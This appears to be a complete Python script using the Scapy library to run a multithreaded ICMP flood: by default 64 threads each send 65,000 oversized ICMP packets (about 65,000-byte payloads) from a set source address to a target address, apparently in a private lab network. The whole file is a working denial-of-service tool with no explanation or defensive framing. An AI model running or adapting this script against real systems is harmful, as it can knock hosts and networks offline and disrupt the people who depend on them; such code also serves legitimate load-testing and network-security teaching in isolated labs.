from scapy.all import *
from scapy.layers.inet import *
import threading
import sys
import signal

def handler(signum, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

if len(sys.argv) > 1:
    threads = int(sys.argv[1])
else:
    threads = 64

source_ip = "10.1.3.2"
target_ip = "10.1.5.2"

def thread_function():
    ip = IP(src = source_ip, dst = target_ip)
    icmp = ICMP()
    raw = Raw(b"X" * 65000)
    pkt = ip / icmp / raw
    send(pkt, count=65000, verbose=0, inter=0.0001)

for i in range(threads):
    x = threading.Thread(target=thread_function, args=())
    x.start()